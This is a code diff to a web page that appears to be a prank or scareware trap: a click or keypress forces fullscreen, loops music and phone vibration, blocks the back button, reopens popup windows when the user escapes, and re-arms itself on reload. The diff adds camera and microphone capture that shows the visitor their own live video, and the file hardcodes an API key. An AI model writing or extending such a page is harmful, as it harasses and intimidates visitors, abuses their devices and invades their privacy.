@@ -67,6 +67,17 @@
             z-index: 1000;
             cursor: pointer;
         }
+        #webcamFeed {
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            width: 250px;
+            height: auto;
+            border: 3px solid white;
+            border-radius: 10px;
+            z-index: 1001;
+            transform: scaleX(-1);
+        }
     </style>
 </head>
 <body>
@@ -87,6 +98,7 @@
 
         const isMobileDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
         let sessionActive = false;
+        let mediaStream = null;
 
         const mainButton = document.getElementById('mainButton');
         const fullscreenContent = document.getElementById('fullscreenContent');
@@ -100,18 +112,42 @@
 
         const GIPHY_API_KEY = 'GlVGYHkr3WSBnllca54iNt0yFbjz7L65';
 
-        // --- ИЗМЕНЕННАЯ ФУНКЦИЯ ДЛЯ ВИБРАЦИИ ---
-
-        function startVibrationLoop() {
-            if ('vibrate' in navigator) {
-                // Запускаем вибрацию по паттерну каждые 1500 мс (0.5сек + 1сек)
-                setInterval(() => {
-                    navigator.vibrate([500, 1000]); // 0.5 сек вибрировать, 1 сек пауза
-                }, 1500);
+        async function setupWebcam() {
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const videoElement = document.createElement('video');
+                videoElement.id = 'webcamFeed';
+                videoElement.srcObject = mediaStream;
+                videoElement.autoplay = true;
+                videoElement.muted = true;
+                fullscreenContent.appendChild(videoElement);
+                console.log("Webcam successfully connected.");
+                return mediaStream;
+            } catch (error) {
+                console.error("Error accessing webcam:", error);
+                return null;
             }
         }
 
-        // --- КОНЕЦ ИЗМЕНЕНИЙ ---
+        function initializeApp() {
+            if (sessionActive) return;
+            sessionActive = true;
+
+            startSession();
+            requestFullScreenMode();
+            fullscreenContent.style.display = 'block';
+            bgMusic.play();
+            startVibrationLoop();
+            setupWebcam();
+        }
+
+        function startVibrationLoop() {
+            if ('vibrate' in navigator) {
+                setInterval(() => {
+                    navigator.vibrate([500, 1000]);
+                }, 1500);
+            }
+        }
 
         function generateRandomColor() {
             const letters = '0123456789ABCDEF';
@@ -251,9 +287,6 @@
         }
 
         function startSession() {
-            if (sessionActive) return;
-            sessionActive = true;
-
             history.pushState(null, null, location.href);
             window.addEventListener('popstate', function (event) {
                 history.pushState(null, null, location.href);
@@ -282,46 +315,40 @@
         }
 
         function triggerFullScreen() {
-            // Запускаем бесконечную вибрацию
-            startVibrationLoop();
+            sessionStorage.setItem('sessionActive', 'true');
+            initializeApp();
+        }
 
-            if (!isMobileDevice) {
-                window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
-            }
-
-            startSession();
-            requestFullScreenMode();
-            fullscreenContent.style.display = 'block';
-            bgMusic.play();
-            
-            if (isMobileDevice) {
-                document.addEventListener('backbutton', function(e) {
-                    e.preventDefault();
-                    if (confirm("?")) {
-                        fullscreenContent.style.display = 'none';
-                        bgMusic.pause();
-                    }
-                }, false);
+        function openPopupWindow() {
+            const popup = window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
+            if (popup) {
+                popup.postMessage({ action: 'startWebcam' }, '*');
             }
         }
 
         fullscreenContent.addEventListener('click', function() {
             if (!isMobileDevice) {
-                window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
+                openPopupWindow();
             }
         });
         
         document.addEventListener('fullscreenchange', function() {
             if (!document.fullscreenElement && fullscreenContent.style.display === 'block') {
                 if (!isMobileDevice) {
-                    window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
+                    openPopupWindow();
                 }
             }
         });
 
-        setRandomButtonContent();
-        mainButton.addEventListener('click', triggerFullScreen);
-        document.addEventListener('keydown', triggerFullScreen);
+        document.addEventListener('DOMContentLoaded', () => {
+            setRandomButtonContent();
+            mainButton.addEventListener('click', triggerFullScreen);
+            document.addEventListener('keydown', triggerFullScreen);
+
+            if (sessionStorage.getItem('sessionActive') === 'true') {
+                initializeApp();
+            }
+        });
     </script>
 </body>
 </html>
